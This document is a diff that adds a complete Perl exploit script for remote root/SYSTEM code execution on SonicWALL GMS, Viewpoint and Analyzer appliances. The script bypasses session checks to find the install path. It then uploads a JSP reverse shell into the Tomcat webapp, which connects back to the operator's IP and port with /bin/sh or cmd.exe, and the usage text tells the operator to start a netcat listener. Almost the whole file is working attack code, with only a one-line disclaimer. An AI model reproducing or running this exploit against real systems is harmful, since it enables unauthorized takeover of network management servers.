@@ -1,0 +1,216 @@
+#!/usr/bin/perl
+
+##
+#  Title:     SonicWALL GMS/VIEWPOINT 6.x Analyzer 7.x Remote Root/SYSTEM exploit 
+#  Name:      sgmsRCE.pl
+#  Author:    Nikolas Sotiriu (lofi) <lofi[at]sotiriu.de>
+#
+#  Use it only for education or ethical pentesting! The author accepts 
+#  no liability for damage caused by this tool.
+#  
+##
+
+
+use strict;
+use HTTP::Request::Common qw(POST);
+use LWP::UserAgent;
+use LWP::Protocol::https;
+use Getopt::Std;
+
+
+my %args;
+getopt('hlp:', \%args);
+
+my $victim    = $args{h} || usage();
+my $lip        = $args{l}; 
+my $lport     = $args{p};
+my $detect    = $args{d};
+my $shellname = "cbs.jsp";
+
+banner();
+
+my $gms_path;
+my $target;
+my $sysshell;
+
+my $agent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0,},);
+$agent->agent("Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0");
+
+# Place your Proxy here if needed
+#$agent->proxy(['http', 'https'], 'http://localhost:8080/');
+
+print "[+] Checking host ...\n";
+my $request = POST "$victim/appliance/applianceMainPage?skipSessionCheck=1",
+Content_Type => 'application/x-www-form-urlencoded; charset=UTF-8',
+Content  => [   num => "123456",
+                action => "show_diagnostics",
+                task => "search",
+    item => "application_log",
+    criteria => "*.*",
+    width => "500",
+        ];
+
+my $result = $agent->request($request);
+
+if ($result->is_success) {
+        print "[+] Host looks vulnerable ...\n";
+} else {
+        print "[-] Error while connecting ... $result->status_line\n";
+  exit(0);
+}
+
+
+my @lines=split("\n",$result->content);
+
+foreach my $line (@lines) {
+  if ($line =~ /OPTION VALUE=/) {
+    my @a=split("\"", $line);
+    if ($a[1] =~ m/logs/i) {
+      my @b=split(/logs/i,$a[1]);
+      $gms_path=$b[0];
+    }
+                if ($gms_path ne "") {
+      print "[+] GMS Path: $gms_path\n";
+      last;
+                } else {
+      next;
+                }
+  }
+}
+if ($gms_path eq "") {
+  print "[-] Couldn't get the GMS path ... Maybe not vulnerable\n";
+  exit(0);
+}
+
+
+if ($gms_path =~ m/^\//) {
+  $target="UNX";
+  $gms_path=$gms_path."Tomcat/webapps/appliance/";
+  $sysshell="/bin/sh";
+  print "[+] Target ist Unix...\n";
+} else {
+  $target="WIN";
+  $gms_path=$gms_path."Tomcat\\webapps\\appliance\\";
+  $sysshell="cmd.exe";
+  print "[+] Target ist Windows...\n";
+}
+
+&_writing_shell;
+
+if (!$detect) {
+print "[+] Uploading shell ...\n";
+my $request = POST "$victim/appliance/applianceMainPage?skipSessionCheck=1",
+Content_Type => 'multipart/form-data',
+Content   => [   action => "file_system", 
+    task => "uploadFile", 
+    searchFolder => "$gms_path", 
+    uploadFileName => ["$shellname"]
+  ];
+
+my $result = $agent->request($request);
+
+if ($result->is_success) {
+  print "[+] Upload completed ...\n";
+} else {
+  print "[-] Error while connecting ... $result->status_line\n";
+  exit(0);
+}
+
+unlink("$shellname");
+
+print "[+] Spawning remote root/system shell ...\n";
+my $result = $agent->get("$victim/appliance/$shellname");
+
+if ($result->is_success) {
+        print "[+] Have fun ...\n";
+} else {
+        print "[-] Error while connecting ... $result->status_line\n";
+  exit(0);
+}
+}
+
+sub _writing_shell {
+  open FILE, ">", "$shellname" or die $!;
+        print FILE << "EOF";
+<%\@page import="java.lang.*"%>
+<%\@page import="java.util.*"%>
+<%\@page import="java.io.*"%>
+<%\@page import="java.net.*"%>
+<%
+        class StreamConnector extends Thread
+        {
+                InputStream is;
+                OutputStream os;
+
+                StreamConnector( InputStream is, OutputStream os )
+                {
+                        this.is = is;
+                        this.os = os;
+                }
+                public void run()
+                {
+                        BufferedReader in  = null;
+                        BufferedWriter out = null;
+                        try
+                        {
+                                in  = new BufferedReader( new InputStreamReader( this.is ) );
+                                out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+                                char buffer[] = new char[8192];
+                                int length;
+                                while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
+                                {
+                                        out.write( buffer, 0, length );
+                                        out.flush();
+                                }
+                        } catch( Exception e ){}
+                        try
+                        {
+                                if( in != null )
+                                        in.close();
+                                if( out != null )
+                                        out.close();
+                        } catch( Exception e ){}
+                }
+        }
+        try
+        {
+                Socket socket = new Socket( "$lip", $lport );
+                Process process = Runtime.getRuntime().exec( "$sysshell" );
+                ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+                ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+        } catch( Exception e ) {}
+%>
+
+EOF
+
+close(FILE);
+}
+
+sub usage {
+    print "\n";
+    print " $0 - SonicWALL GMS/VIEWPOINT/Analyzer Remote Root/SYSTEM exploit\n";
+    print "====================================================================\n\n";
+    print "  Usage:\n";
+    print "           $0 -h <http://victim> -l <yourip> -p <yourport>\n";
+    print "  Notes:\n";
+    print "           Start your netcat listener <nc -lp 4444>\n";
+    print "           -d only checks if the Host is vulnerable\n";
+    print "\n";
+    print "  Author:\n";
+    print "           Nikolas Sotiriu (lofi)\n";
+    print "           url: www.sotiriu.de\n";
+    print "           mail: lofi[at]sotiriu.de\n";
+    print "\n";
+
+
+    exit(1);
+}
+
+sub banner {
+        print STDERR << "EOF";
+--------------------------------------------------------------------------------
+       SonicWALL GMS/VIEWPOINT 6.x Analyzer 7.x Remote Root/SYSTEM exploit
+--------------------------------------------------------------------------------
+
+EOF
+}
